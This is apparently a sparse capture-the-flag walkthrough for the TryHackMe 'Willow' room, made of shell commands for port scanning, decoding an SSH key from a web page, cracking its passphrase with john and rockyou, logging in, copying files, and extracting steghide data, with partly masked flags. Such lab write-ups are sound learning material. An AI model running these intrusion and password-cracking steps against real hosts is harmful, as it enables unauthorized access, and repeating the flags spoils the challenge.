...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ sudo nmap -A -sS -sC -sV -O 10.10.126.38
...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ curl -s http://10.10.126.38/ | html2text > code.txt
bibo318@parrot:~/CTFs/tryhackme/Willow$ cat code.txt | xxd -r -p
...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ cat rsa_keys
...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ cat code.txt | xxd -r -p > code_d.txt
bibo318@parrot:~/CTFs/tryhackme/Willow$ touch id_rsa
bibo318@parrot:~/CTFs/tryhackme/Willow$ chmod 600 id_rsa
bibo318@parrot:~/CTFs/tryhackme/Willow$ ssh -i id_rsa willow@10.10.126.38
...
bibo318@parrot:~/CTFs/tryhackme/Willow$ /usr/share/john/ssh2john.py id_rsa > ssh.hash
bibo318@parrot:~/CTFs/tryhackme/Willow$ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ scp -i id_rsa willow@10.10.126.38:/home/willow/user.jpg .
Enter passphrase for key 'id_rsa':
...
`THM{V0N318*****beneath_th_weeping_willow_tree12**123:))}`
...
```
bibo318@parrot:~/CTFs/tryhackme/Willow$ steghide extract -sf user.jpg
Enter passphrase:
wrote extracted data to "root.txt".
bibo318@parrot:~/CTFs/tryhackme/Willow$ cat root.txt
THM{V0N318*****find_a_red_rose_on_the_grave}
```
...
`THM{V0N318*****find_a_red_rose_on_the_grave12**123:))}`
